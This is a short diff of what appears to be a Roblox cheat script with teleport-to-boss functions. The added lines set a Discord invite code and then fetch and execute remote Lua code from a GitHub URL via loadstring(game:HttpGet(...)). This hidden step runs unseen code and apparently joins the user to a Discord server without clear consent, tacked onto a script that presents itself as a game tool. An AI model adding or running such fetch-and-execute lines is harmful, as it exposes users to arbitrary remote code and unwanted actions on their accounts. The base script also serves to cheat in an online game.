@@ -266,3 +266,8 @@ function teleportworld7()
         teleportto(game:GetService("Workspace").BossModels.Ice.UpperTorso.CFrame)
     end
 end
+
+
+getgenv().InviteCode = "wSjHbHM9j9"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/Discord-Auto-Join.lua"))()
